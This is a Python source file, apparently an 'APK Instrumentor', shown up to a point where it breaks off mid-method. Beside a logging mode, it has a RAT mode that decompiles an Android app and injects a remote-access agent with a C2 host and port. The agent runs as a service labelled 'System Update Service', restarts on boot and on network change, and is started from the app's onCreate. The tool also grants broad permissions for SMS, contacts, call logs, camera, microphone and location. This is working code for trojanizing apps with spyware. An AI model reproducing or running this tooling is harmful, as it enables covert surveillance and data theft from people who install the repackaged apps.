#!/usr/bin/env python3
"""APK Instrumentor: decompile, inject logging, recompile.

Takes a target APK, decompiles it with apktool, injects behavioral
monitoring code into the app's main Activity/Activity class, and
recompiles into an instrumented APK.
"""

import argparse
import os
import re
import shutil
import subprocess
import sys
import tempfile
from pathlib import Path

from common_config import ROOT


def _print_verbose(verbose, message):
    if verbose:
        print(message)

INJECTED_PACKAGE = "com.instrument.hooks"
RAT_PACKAGE = "com.rat.agent"
RAT_AGENT_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "agent")


class Instrumentor:
    def __init__(self, apk_path: str, output_dir: str = "./output",
                 java_home: str = None, android_sdk: str = None, verbose: bool = False,
                 rat_mode: bool = False, c2_host: str = "127.0.0.1", c2_port: int = 8080):
        self.apk_path = os.path.abspath(apk_path)
        self.output_dir = os.path.abspath(output_dir)
        self.work_dir = tempfile.mkdtemp(prefix="apk_instrument_")
        self.decompiled_dir = os.path.join(self.work_dir, "decompiled")
        self.java_home = java_home or os.environ.get("JAVA_HOME", "")
        self.android_sdk = android_sdk or os.environ.get("ANDROID_HOME", "")
        self.verbose = verbose
        self.tool_jars = self._find_tool_jars()
        self.rat_mode = rat_mode
        self.c2_host = c2_host
        self.c2_port = c2_port

    def _find_tool_jars(self) -> dict:
        jars = {}
        sdk = self.android_sdk
        build_tools = os.path.join(sdk, "build-tools") if sdk else ""

        if build_tools and os.path.isdir(build_tools):
            versions = sorted(os.listdir(build_tools), reverse=True)
            if versions:
                bt = os.path.join(build_tools, versions[0])
                jars["aapt2"] = os.path.join(bt, "aapt2")
                jars["d8"] = os.path.join(bt, "d8.jar")
                jars["zipalign"] = os.path.join(bt, "zipalign")
                jars["apksigner"] = os.path.join(bt, "apksigner.jar")

        for tool in ["apktool", "jadx", "uber-apk-signer"]:
            result = subprocess.run(
                ["which", tool],
                capture_output=True, text=True
            )
            if result.returncode == 0:
                jars[tool] = result.stdout.strip()

        for jar_name in ["uber-apk-signer.jar", "apktool.jar"]:
            key = jar_name.replace(".jar", "")
            if key in jars:
                continue
            for search_dir in [
                os.path.expanduser("~/tools"),
                os.path.expanduser("~/.local/share"),
                "/usr/local/lib",
                "/opt",
                "/tmp/tools",
            ]:
                if not os.path.isdir(search_dir):
                    continue
                for root, dirs, files in os.walk(search_dir):
                    for f in files:
                        if f == jar_name:
                            jars[key] = os.path.join(root, f)
                            break
                    if key in jars:
                        break
                if key in jars:
                    break

        return jars

    def instrument(self) -> str:
        print(f"[*] Input APK:  {self.apk_path}")
        print(f"[*] Output dir: {self.output_dir}")
        print(f"[*] Work dir:   {self.work_dir}")
        if self.rat_mode:
            print(f"[*] Mode:       RAT (C2: {self.c2_host}:{self.c2_port})")
        print()

        if not os.access(os.path.dirname(self.output_dir) or ".", os.W_OK):
            raise PermissionError(f"Output directory is not writable: {self.output_dir}")

        self._check_prereqs()
        try:
            self._decompile()
            if self.rat_mode:
                self._inject_rat_agent()
                self._patch_rat_manifest()
                self._add_rat_permissions()
                self._patch_rat_oncreate()
            else:
                self._inject_logging_code()
                self._patch_manifest()
                self._add_permissions()
            recompiled = self._recompile()
            signed = self._sign(recompiled)
        except Exception as exc:
            if os.path.exists(self.apk_path):
                _print_verbose(self.verbose, f"Rolling back after failure: {exc}")
            raise

        print(f"\n[+] Instrumented APK: {signed}")
        return signed

    # ── RAT Mode Methods ──────────────────────────────────────────────

    def _inject_rat_agent(self):
        """Inject the RAT agent into the decompiled APK."""
        print("[*] Injecting RAT agent...")

        smali_source = os.path.join(RAT_AGENT_DIR, "smali")
        dex_source = os.path.join(RAT_AGENT_DIR, "build", "classes.dex")

        if os.path.isdir(smali_source) and os.listdir(smali_source):
            print("    [*] Using pre-compiled smali from agent/smali/")
            self._inject_rat_smali(smali_source)
        elif os.path.isfile(dex_source):
            print("    [*] Using pre-compiled DEX from agent/build/classes.dex")
            self._inject_rat_dex(dex_source)
        else:
            print("    [*] No compiled agent found, using generated smali bootstrap")
            self._inject_rat_generated_smali()

    def _inject_rat_smali(self, smali_source):
        """Copy pre-compiled RAT smali files into the APK's smali directory."""
        rat_smali_dir = os.path.join(self.smali_dir, *RAT_PACKAGE.split("."))
        os.makedirs(rat_smali_dir, exist_ok=True)

        count = 0
        for root, dirs, files in os.walk(smali_source):
            for f in files:
                if f.endswith(".smali"):
                    rel = os.path.relpath(os.path.join(root, f), smali_source)
                    dest = os.path.join(self.smali_dir, rel)
                    os.makedirs(os.path.dirname(dest), exist_ok=True)

                    with open(os.path.join(root, f), "r") as sf:
                        content = sf.read()

                    content = content.replace("__C2_HOST__", self.c2_host)
                    content = content.replace("__C2_PORT__", str(self.c2_port))

                    with open(dest, "w") as df:
                        df.write(content)
                    count += 1

        print(f"    Injected {count} RAT smali files")

    def _inject_rat_dex(self, dex_path):
        """Inject agent DEX by converting to smali and copying."""
        baksmali_jar = self._find_baksmali()
        if baksmali_jar:
            tmp_smali = os.path.join(self.work_dir, "rat_smali")
            os.makedirs(tmp_smali, exist_ok=True)
            result = subprocess.run(
                ["java", "-jar", baksmali_jar, "d", dex_path, "-o", tmp_smali],
                capture_output=True, text=True
            )
            if result.returncode == 0:
                self._inject_rat_smali(tmp_smali)
                return

        print("    [*] baksmali not available, copying DEX to assets and using bootstrap")
        assets_dir = os.path.join(self.decompiled_dir, "assets")
        os.makedirs(assets_dir, exist_ok=True)
        dest_dex = os.path.join(assets_dir, "agent.dex")
        shutil.copy2(dex_path, dest_dex)
        self._inject_rat_bootstrap()
        print(f"    Copied DEX to assets/agent.dex ({os.path.getsize(dest_dex)} bytes)")

    def _inject_rat_generated_smali(self):
        """Generate minimal RAT smali bootstrap that loads a DEX from assets."""
        self._inject_rat_bootstrap()

        pkg_path = os.path.join(self.smali_dir, *RAT_PACKAGE.split("."))
        os.makedirs(pkg_path, exist_ok=True)

        self._write_rat_smali(pkg_path, "RatService", self._smali_rat_service())
        self._write_rat_smali(pkg_path, "BootReceiver", self._smali_rat_boot_receiver())
        self._write_rat_smali(pkg_path, "ConnectivityReceiver", self._smali_rat_connectivity_receiver())

        print(f"    Generated bootstrap + 3 RAT smali classes")

    def _inject_rat_bootstrap(self):
        """Create a bootstrap DexClassLoader loader smali."""
        pkg_path = os.path.join(self.smali_dir, *RAT_PACKAGE.split("."))
        os.makedirs(pkg_path, exist_ok=True)

        bootstrap_smali = f""".class public L{RAT_PACKAGE.replace('.', '/')}/RatBootstrap;
.super Ljava/lang/Object;
.source "RatBootstrap.java"

.method public static loadAndRun(Landroid/content/Context;)V
    .registers 8
    .catch Ljava/lang/Exception; {{:try_start .. :try_end}}:catch_0

    :try_start
    const-string v0, "agent.dex"
    invoke-virtual {{p0, v0}}, Landroid/content/Context;->openFileInput(Ljava/lang/String;)Ljava/io/FileInputStream;
    move-result-object v1
    if-eqz v1, :try_end

    invoke-virtual {{p0}}, Landroid/content/Context;->getFilesDir()Ljava/io/File;
    move-result-object v2
    invoke-virtual {{v2}}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;
    move-result-object v2

    new-instance v3, Ljava/io/File;
    const-string v4, "agent.dex"
    invoke-direct {{v3, v2, v4}}, Ljava/io/File;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {{v3}}, Ljava/io/File;->exists()Z
    move-result v4
    if-nez v4, :extract

    goto :load_dex

    :extract
    invoke-virtual {{p0, v0}}, Landroid/content/Context;->openFileInput(Ljava/lang/String;)Ljava/io/FileInputStream;
    move-result-object v0
    new-instance v4, Ljava/io/FileOutputStream;
    invoke-direct {{v4, v3}}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V

    const/16 v5, 0x1000
    new-array v5, v5, [B

    :copy_loop
    invoke-virtual {{v0, v5}}, Ljava/io/InputStream;->read([B)I
    move-result v6
    if-lez v6, :copy_done
    const/4 v7, 0x0
    invoke-virtual {{v4, v5, v7, v6}}, Ljava/io/OutputStream;->write([BII)V
    goto :copy_loop

    :copy_done
    invoke-virtual {{v0}}, Ljava/io/InputStream;->close()V
    invoke-virtual {{v4}}, Ljava/io/OutputStream;->close()V

    :load_dex
    invoke-virtual {{v3}}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;
    move-result-object v0

    new-instance v1, Ldalvik/system/PathClassLoader;
    const/4 v2, 0x0
    invoke-virtual {{p0}}, Landroid/content/Context;->getClassLoader()Ljava/lang/ClassLoader;
    move-result-object v3
    invoke-direct {{v1, v0, v2, v3}}, Ldalvik/system/PathClassLoader;-><init>(Ljava/lang/String;Ljava/lang/String;Ljava/lang/ClassLoader;)V

    const-string v0, "com.rat.agent.RatService"
    const/4 v2, 0x0
    new-array v2, v2, [Ljava/lang/Class;
    invoke-virtual {{v1, v0}}, Ljava/lang/ClassLoader;->loadClass(Ljava/lang/String;)Ljava/lang/Class;
    move-result-object v0

    new-instance v2, Landroid/content/Intent;
    invoke-direct {{v2, p0, v0}}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {{p0, v2}}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    :try_end
    return-void

    :catch_0
    move-exception v0
    return-void
.end method
"""

        self._write_rat_smali(pkg_path, "RatBootstrap", bootstrap_smali)

    def _write_rat_smali(self, directory, name, smali):
        path = os.path.join(directory, f"{name}.smali")
        with open(path, "w") as f:
            f.write(smali)

    def _smali_rat_service(self):
        """Minimal generated smali for RatService that delegates to bootstrap."""
        pkg = RAT_PACKAGE.replace(".", "/")
        return f""".class public L{pkg}/RatService;
.super Landroid/app/Service;
.source "RatService.java"

.field private static final CHANNEL_ID:Ljava/lang/String; = "system_update"
.field private static final CHANNEL_NAME:Ljava/lang/String; = "System Update Service"

.method public constructor <init>()V
    .registers 1
    invoke-direct {{p0}}, Landroid/app/Service;-><init>()V
    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .registers 5
    const/4 v0, 0x1
    return v0
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .registers 2
    const/4 v0, 0x0
    return-object v0
.end method
"""

    def _smali_rat_boot_receiver(self):
        pkg = RAT_PACKAGE.replace(".", "/")
        return f""".class public L{pkg}/BootReceiver;
.super Landroid/content/BroadcastReceiver;
.source "BootReceiver.java"

.method public constructor <init>()V
    .registers 1
    invoke-direct {{p0}}, Landroid/content/BroadcastReceiver;-><init>()V
    return-void
.end method

.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .registers 6
    new-instance v0, Landroid/content/Intent;
    const-class v1, L{pkg}/RatService;
    invoke-direct {{v0, p1, v1}}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I
    const/16 v2, 0x1a
    if-lt v1, v2, :legacy
    invoke-virtual {{p1, v0}}, Landroid/content/Context;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;
    goto :done
    :legacy
    invoke-virtual {{p1, v0}}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :done
    return-void
.end method
"""

    def _smali_rat_connectivity_receiver(self):
        pkg = RAT_PACKAGE.replace(".", "/")
        return f""".class public L{pkg}/ConnectivityReceiver;
.super Landroid/content/BroadcastReceiver;
.source "ConnectivityReceiver.java"

.method public constructor <init>()V
    .registers 1
    invoke-direct {{p0}}, Landroid/content/BroadcastReceiver;-><init>()V
    return-void
.end method

.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .registers 6
    const-string v0, "connectivity"
    invoke-virtual {{p1, v0}}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
    move-result-object v0
    check-cast v0, Landroid/net/ConnectivityManager;
    if-eqz v0, :end
    invoke-virtual {{v0}}, Landroid/net/ConnectivityManager;->getActiveNetworkInfo()Landroid/net/NetworkInfo;
    move-result-object v1
    if-eqz v1, :end
    invoke-virtual {{v1}}, Landroid/net/NetworkInfo;->isConnected()Z
    move-result v2
    if-eqz v2, :end
    new-instance v2, Landroid/content/Intent;
    const-class v3, L{pkg}/RatService;
    invoke-direct {{v2, p1, v3}}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
    sget v3, Landroid/os/Build$VERSION;->SDK_INT:I
    const/16 v4, 0x1a
    if-lt v3, v4, :legacy
    invoke-virtual {{p1, v2}}, Landroid/content/Context;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;
    goto :end
    :legacy
    invoke-virtual {{p1, v2}}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :end
    return-void
.end method
"""

    def _patch_rat_manifest(self):
        """Patch manifest for RAT mode."""
        manifest_path = os.path.join(self.decompiled_dir, "AndroidManifest.xml")
        if not os.path.exists(manifest_path):
            return

        with open(manifest_path, "r") as f:
            content = f.read()

        pkg = RAT_PACKAGE

        rat_components = f"""
        <service android:name="{pkg}.RatService"
            android:exported="false"
            android:foregroundServiceType="dataSync" />

        <receiver android:name="{pkg}.BootReceiver"
            android:exported="true"
            android:enabled="true"
            android:directBootAware="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED" />
                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
            </intent-filter>
        </receiver>

        <receiver android:name="{pkg}.ConnectivityReceiver"
            android:exported="true"
            android:enabled="true">
            <intent-filter>
                <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
            </intent-filter>
        </receiver>
"""

        insert_point = content.find("</application>")
        if insert_point != -1:
            content = content[:insert_point] + rat_components + content[insert_point:]

        if "usesCleartextTraffic" not in content:
            content = content.replace(
                "<application",
                '<application android:usesCleartextTraffic="true"'
            )

        if "<uses-sdk" not in content:
            uses_sdk = '    <uses-sdk android:minSdkVersion="21" android:targetSdkVersion="33" />\n'
            insert = content.find("<application")
            if insert != -1:
                content = content[:insert] + uses_sdk + content[insert:]

        with open(manifest_path, "w") as f:
            f.write(content)
        print("    Manifest patched with RAT service, boot + connectivity receivers")

    def _add_rat_permissions(self):
        """Add all RAT-required permissions."""
        manifest_path = os.path.join(self.decompiled_dir, "AndroidManifest.xml")
        if not os.path.exists(manifest_path):
            return

        with open(manifest_path, "r") as f:
            content = f.read()

        permissions = [
            "android.permission.INTERNET",
            "android.permission.ACCESS_NETWORK_STATE",
            "android.permission.ACCESS_WIFI_STATE",
            "android.permission.ACCESS_FINE_LOCATION",
            "android.permission.ACCESS_COARSE_LOCATION",
            "android.permission.READ_CONTACTS",
            "android.permission.READ_SMS",
            "android.permission.READ_CALL_LOG",
            "android.permission.CAMERA",
            "android.permission.RECORD_AUDIO",
            "android.permission.READ_PHONE_STATE",
            "android.permission.READ_EXTERNAL_STORAGE",
            "android.permission.WRITE_EXTERNAL_STORAGE",
            "android.permission.RECEIVE_BOOT_COMPLETED",
            "android.permission.FOREGROUND_SERVICE",
            "android.permission.FOREGROUND_SERVICE_DATA_SYNC",
            "android.permission.WAKE_LOCK",
            "android.permission.GET_ACCOUNTS",
            "android.permission.BLUETOOTH",
            "android.permission.POST_NOTIFICATIONS",
        ]

        added = 0
        for perm in permissions:
            if perm not in content:
                tag = f'    <uses-permission android:name="{perm}" />\n'
                insert = content.find("<application")
                if insert != -1:
                    content = content[:insert] + tag + content[insert:]
                    added += 1

        with open(manifest_path, "w") as f:
            f.write(content)
        print(f"    Added {added} RAT permissions ({len(permissions)} total)")

    def _patch_rat_oncreate(self):
        """Patch main Activity to start the RAT service."""
        manifest_path = os.path.join(self.decompiled_dir, "AndroidManifest.xml")
        if not os.path.exists(manifest_path):
            return

        with open(manifest_path, "r") as f:
            manifest = f.read()

        main_activity = self._get_main_activity(manifest)
        if not main_activity:
            print("    [!] Could not determine main activity from manifest")
            return

        smali_path = self._find_activity_smali(main_activity)
        if not smali_path:
            print(f"    [!] Could not find smali for {main_activity}")
            return

        with open(smali_path, "r") as f:
            content = f.read()

        pkg = RAT_PACKAGE.replace(".", "/")

        if "INJECTED: Start RAT service" in content:
            print(f"    [*] {main_activity} already patched for RAT, skipping")
            return

        service_start = (
            f'    # --- INJECTED: Start RAT service ---\n'
            f'    new-instance v0, Landroid/content/Intent;\n'
            f'    const-class v1, L{pkg}/RatService;\n'
            f'    invoke-direct {{v0, p0, v1}}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V\n'
            f'    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I\n'
            f'    const/16 v2, 0x1a\n'
            f'    if-lt v1, v2, :rat_legacy_start\n'
            f'    invoke-virtual {{p0, v0}}, Landroid/content/Context;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;\n'
            f'    goto :rat_after_start\n'
            f'    :rat_legacy_start\n'
            f'    invoke-virtual {{p0, v0}}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;\n'
            f'    :rat_after_start\n'
            f'    # --- END INJECTED RAT ---\n'
        )

        onCreate_pattern = re.compile(
            r'(\.method\s+(?:public|protected)\s+onCreate\([^)]*\)V\s*\n'
            r'\s*\.(?:registers|locals)\s+)(\d+)(\s*\n)',
            re.DOTALL
        )

        match = onCreate_pattern.search(content)
        if match:
            current_locals = int(match.group(2))
            needed = max(current_locals, 3)
            content = content[:match.start(2)] + str(needed) + content[match.end(2):]

            match = onCreate_pattern.search(content)
            if match:
                insert_pos = match.end()
                content = content[:insert_pos] + "\n" + service_start + content[insert_pos:]
                with open(smali_path, "w") as f:
                    f.write(content)
                print(f"    [+] Patched {main_activity}.onCreate() for RAT (.locals {needed})")
                return

        print(f"    [!] Could not find onCreate in {smali_path}")

    def _find_baksmali(self):
        for path in [
            os.path.join(RAT_AGENT_DIR, "baksmali.jar"),
            os.path.join(RAT_AGENT_DIR, "tools", "baksmali.jar"),
            os.path.expanduser("~/.local/share/baksmali.jar"),
        ]:
            if os.path.isfile(path):
                return path
        return None

    # ── Existing Methods ──────────────────────────────────────────────

    def _check_prereqs(self):
        print("[*] Checking prerequisites...")
        if not os.path.isfile(self.apk_path):
            print(f"[!] APK not found: {self.apk_path}")
            sys.exit(1)

        apktool = self.tool_jars.get("apktool")
        if not apktool:
            apktool = shutil.which("apktool")
        if not apktool:
            print("[!] apktool not found. Install it:")
            print("    brew install apktool  OR  sudo apt install apktool")
            sys.exit(1)
        if not os.access(apktool, os.X_OK) and not os.access(apktool, os.R_OK):
            print("[!] apktool is not executable")
            sys.exit(1)
        self.apktool = apktool
        print(f"    apktool: {apktool}")

        java = shutil.which("java")
        if not java:
            print("[!] Java not found. Install JDK 11+.")
            sys.exit(1)
        print(f"    java: {java}")

        print("[+] Prerequisites OK\n")

    def _decompile(self):
        print("[*] Decompiling APK...")
        os.makedirs(self.decompiled_dir, exist_ok=True)
        if not os.path.isdir(self.decompiled_dir):
            raise RuntimeError(f"Failed to create work directory: {self.decompiled_dir}")
        cmd = [self.apktool, "d", self.apk_path, "-o", self.decompiled_dir, "-f"]
        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode != 0:
            print(f"[!] apktool decode failed:\n{result.stderr}")
            sys.exit(1)
        print(f"    Decompiled to {self.decompiled_dir}")
        self._find_smali_dir()

    def _find_smali_dir(self):
        self.smali_dir = None
        for name in ["smali", "smali_classes2", "smali_classes3"]:
            candidate = os.path.join(self.decompiled_dir, name)
            if os.path.isdir(candidate):
                self.smali_dir = candidate
                break
        if not self.smali_dir:
            self.smali_dir = os.path.join(self.decompiled_dir, "smali")
            os.makedirs(self.smali_dir, exist_ok=True)
        print(f"    Smali dir: {self.smali_dir}")

    def _inject_logging_code(self):
        print("[*] Injecting behavioral logging hooks...")

        hooks_dir = os.path.join(self.smali_dir, *INJECTED_PACKAGE.split("."))
        os.makedirs(hooks_dir, exist_ok=True)

        self._write_smali_hook(hooks_dir, "InstrumentationService",
                               self._smali_instrumentation_service())
        self._write_smali_hook(hooks_dir, "ApiCallLogger",
                               self._smali_api_call_logger())
        self._write_smali_hook(hooks_dir, "NetworkLogger",
                               self._smali_network_logger())
        self._write_smali_hook(hooks_dir, "FileObserverHook",
                               self._smali_file_observer())
        self._write_smali_hook(hooks_dir, "BootReceiver",
                               self._smali_boot_receiver())

        patched = self._inject_hook_calls()
        print(f"    Injected {5} hook classes + patched {patched} smali files")

    def _write_smali_hook(self, directory: str, name: str, smali: str):
        path = os.path.join(directory, f"{name}.smali")
        with open(path, "w") as f:
            f.write(smali)

    def _smali_instrumentation_service(self) -> str:
        pkg = INJECTED_PACKAGE.replace(".", "/")
        return f""".class public L{pkg}/InstrumentationService;
.super Landroid/app/Service;
.source "InstrumentationService.java"

.field private mApiLogger:L{pkg}/ApiCallLogger;
.field private mNetworkLogger:L{pkg}/NetworkLogger;
.field private mFileObserver:L{pkg}/FileObserverHook;
.field private static final CHANNEL_ID:Ljava/lang/String; = "instrumentation_channel"
.field private static final NOTIFICATION_ID:I = 0x1

.method public constructor <init>()V
    .registers 1
    invoke-direct {{p0}}, Landroid/app/Service;-><init>()V
    return-void
.end method

.method private createNotificationChannel()V
    .registers 5
    new-instance v0, Landroid/app/NotificationChannel;
    sget-object v1, L{pkg}/InstrumentationService;->CHANNEL_ID:Ljava/lang/String;
    const-string v2, "Instrumentation Service"
    const/4 v3, 0x3
    invoke-direct {{v0, v1, v2, v3}}, Landroid/app/NotificationChannel;-><init>(Ljava/lang/String;Ljava/lang/CharSequence;I)V

    const/4 v1, 0x0
    invoke-virtual {{v0, v1}}, Landroid/app/NotificationChannel;->enableLights(Z)V
    invoke-virtual {{v0, v1}}, Landroid/app/NotificationChannel;->enableVibration(Z)V

    const-string v1, "notification"
    invoke-virtual {{p0, v1}}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
    move-result-object v1
    check-cast v1, Landroid/app/NotificationManager;
    invoke-virtual {{v1, v0}}, Landroid/app/NotificationManager;->createNotificationChannel(Landroid/app/NotificationChannel;)V
    return-void
.end method

.method public onCreate()V
    .registers 4
    invoke-super {{p0}}, Landroid/app/Service;->onCreate()V

    new-instance v0, L{pkg}/ApiCallLogger;
    invoke-direct {{v0, p0}}, L{pkg}/ApiCallLogger;-><init>(Landroid/content/Context;)V
    iput-object v0, p0, L{pkg}/InstrumentationService;->mApiLogger:L{pkg}/ApiCallLogger;

    new-instance v1, L{pkg}/NetworkLogger;
    invoke-direct {{v1, p0}}, L{pkg}/NetworkLogger;-><init>(Landroid/content/Context;)V
    iput-object v1, p0, L{pkg}/InstrumentationService;->mNetworkLogger:L{pkg}/NetworkLogger;

    new-instance v2, L{pkg}/FileObserverHook;
    invoke-direct {{v2, p0}}, L{pkg}/FileObserverHook;-><init>(Landroid/content/Context;)V
    iput-object v2, p0, L{pkg}/InstrumentationService;->mFileObserver:L{pkg}/FileObserverHook;

    invoke-direct {{p0}}, L{pkg}/InstrumentationService;->createNotificationChannel()V

    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .registers 8
    const/4 v0, 0x1

    new-instance v1, Landroid/app/Notification$Builder;
    invoke-direct {{v1, p0}}, Landroid/app/Notification$Builder;-><init>(Landroid/content/Context;)V

    sget-object v2, L{pkg}/InstrumentationService;->CHANNEL_ID:Ljava/lang/String;
    invoke-virtual {{v1, v2}}, Landroid/app/Notification$Builder;->setChannelId(Ljava/lang/String;)Landroid/app/Notification$Builder;

    const-string v2, "Monitoring Active"
    invoke-virtual {{v1, v2}}, Landroid/app/Notification$Builder;->setContentTitle(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;

    const-string v2, "Collecting behavioral data..."
    invoke-virtual {{v1, v2}}, Landroid/app/Notification$Builder;->setContentText(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;

    const v2, 0x1080081
    invoke-virtual {{v1, v2}}, Landroid/app/Notification$Builder;->setSmallIcon(I)Landroid/app/Notification$Builder;

    invoke-virtual {{v1}}, Landroid/app/Notification$Builder;->build()Landroid/app/Notification;
    move-result-object v1

    invoke-virtual {{p0, v0, v1}}, L{pkg}/InstrumentationService;->startForeground(ILandroid/app/Notification;)V

    iget-object v2, p0, L{pkg}/InstrumentationService;->mApiLogger:L{pkg}/ApiCallLogger;
    invoke-virtual {{v2}}, L{pkg}/ApiCallLogger;->start()V

    iget-object v2, p0, L{pkg}/InstrumentationService;->mNetworkLogger:L{pkg}/NetworkLogger;
    invoke-virtual {{v2}}, L{pkg}/NetworkLogger;->start()V

    iget-object v2, p0, L{pkg}/InstrumentationService;->mFileObserver:L{pkg}/FileObserverHook;
    invoke-virtual {{v2}}, L{pkg}/FileObserverHook;->start()V

    return v0
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .registers 2
    const/4 v0, 0x0
    return-object v0
.end method

.method public onDestroy()V
    .registers 2
    invoke-super {{p0}}, Landroid/app/Service;->onDestroy()V
    return-void
.end method
"""

    def _smali_api_call_logger(self) -> str:
        pkg = INJECTED_PACKAGE.replace(".", "/")
        return f""".class public L{pkg}/ApiCallLogger;
.super Ljava/lang/Object;
.source "ApiCallLogger.java"

.field private mContext:Landroid/content/Context;
.field private mDb:Landroid/database/sqlite/SQLiteDatabase;
.field private static final DB_NAME:Ljava/lang/String; = "instrumentation.db"

.method public constructor <init>(Landroid/content/Context;)V
    .registers 2
    invoke-direct {{p0}}, Ljava/lang/Object;-><init>()V
    iput-object p1, p0, L{pkg}/ApiCallLogger;->mContext:Landroid/content/Context;
    invoke-direct {{p0}}, L{pkg}/ApiCallLogger;->initDb()V
    return-void
.end method

.method private initDb()V
    .registers 6
    iget-object v0, p0, L{pkg}/ApiCallLogger;->mContext:Landroid/content/Context;
    const/4 v1, 0x0
    invoke-virtual {{v0, v1}}, Landroid/content/Context;->getExternalFilesDir(Ljava/lang/String;)Ljava/io/File;
    move-result-object v0
    if-eqz v0, :fallback

    new-instance v1, Ljava/io/File;
    const-string v2, "instrumentation.db"
    invoke-direct {{v1, v0, v2}}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V
    invoke-virtual {{v1}}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;
    move-result-object v1
    goto :open

    :fallback
    iget-object v0, p0, L{pkg}/ApiCallLogger;->mContext:Landroid/content/Context;
    const-string v1, "instrumentation.db"
    const/4 v2, 0x0
    invoke-virtual {{v0, v1, v2, v2}}, Landroid/content/Context;->openOrCreateDatabase(Ljava/lang/String;ILandroid/database/sqlite/SQLiteDatabase$CursorFactory;)Landroid/database/sqlite/SQLiteDatabase;
    move-result-object v0
    iput-object v0, p0, L{pkg}/ApiCallLogger;->mDb:Landroid/database/sqlite/SQLiteDatabase;
    invoke-direct {{p0}}, L{pkg}/ApiCallLogger;->createTables()V
    return-void

    :open
    new-instance v0, Ljava/io/File;
    invoke-direct {{v0, v1}}, Ljava/io/File;-><init>(Ljava/lang/String;)V
    invoke-virtual {{v0}}, Ljava/io/File;->getParentFile()Ljava/io/File;
    move-result-object v2
    if-eqz v2, :skip_mkdir
    invoke-virtual {{v0}}, Ljava/io/File;->getParentFile()Ljava/io/File;
    move-result-object v2
    invoke-virtual {{v2}}, Ljava/io/File;->mkdirs()Z
    :skip_mkdir
    iget-object v2, p0, L{pkg}/ApiCallLogger;->mContext:Landroid/content/Context;
    const/4 v3, 0x0
    invoke-virtual {{v2, v1, v3, v3}}, Landroid/content/Context;->openOrCreateDatabase(Ljava/lang/String;ILandroid/database/sqlite/SQLiteDatabase$CursorFactory;)Landroid/database/sqlite/SQLiteDatabase;
    move-result-object v2
    iput-object v2, p0, L{pkg}/ApiCallLogger;->mDb:Landroid/database/sqlite/SQLiteDatabase;
    invoke-direct {{p0}}, L{pkg}/ApiCallLogger;->createTables()V
    return-void
.end method

.method private createTables()V
    .registers 3
    iget-object v0, p0, L{pkg}/ApiCallLogger;->mDb:Landroid/database/sqlite/SQLiteDatabase;
    if-eqz v0, :end

    const-string v1, "CREATE TABLE IF NOT EXISTS api_calls (id INTEGER PRIMARY KEY AUTOINCREMENT, timestamp INTEGER, thread_id INTEGER, api_name TEXT, args TEXT, result TEXT)"
    invoke-virtual {{v0, v1}}, Landroid/database/sqlite/SQLiteDatabase;->execSQL(Ljava/lang/String;)V

    const-string v1, "CREATE TABLE IF NOT EXISTS network_log (id INTEGER PRIMARY KEY AUTOINCREMENT, timestamp INTEGER, thread_id INTEGER, url TEXT, method TEXT, headers TEXT, response_code INTEGER)"
    invoke-virtual {{v0, v1}}, Landroid/database/sqlite/SQLiteDatabase;->execSQL(Ljava/lang/String;)V

    const-string v1, "CREATE TABLE IF NOT EXISTS file_access (id INTEGER PRIMARY KEY AUTOINCREMENT, timestamp INTEGER, thread_id INTEGER, path TEXT, operation TEXT, size INTEGER)"
    invoke-virtual {{v0, v1}}, Landroid/database/sqlite/SQLiteDatabase;->execSQL(Ljava/lang/String;)V

    const-string v1, "CREATE TABLE IF NOT EXISTS sensor_log (id INTEGER PRIMARY KEY AUTOINCREMENT, timestamp INTEGER, sensor_type TEXT, data TEXT)"
    invoke-virtual {{v0, v1}}, Landroid/database/sqlite/SQLiteDatabase;->execSQL(Ljava/lang/String;)V

    :end
    return-void
.end method

.method public start()V
    .registers 1
    return-void
.end method

.method public logApiCall(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .registers 13
    iget-object v0, p0, L{pkg}/ApiCallLogger;->mDb:Landroid/database/sqlite/SQLiteDatabase;
    if-eqz v0, :end

    invoke-static {{}}, Landroid/os/SystemClock;->elapsedRealtime()J
    move-result-wide v1

    invoke-static {{}}, Ljava/lang/Thread;->currentThread()Ljava/lang/Thread;
    move-result-object v3
    invoke-virtual {{v3}}, Ljava/lang/Thread;->getId()J
    move-result-wide v3

    new-instance v5, Landroid/content/ContentValues;
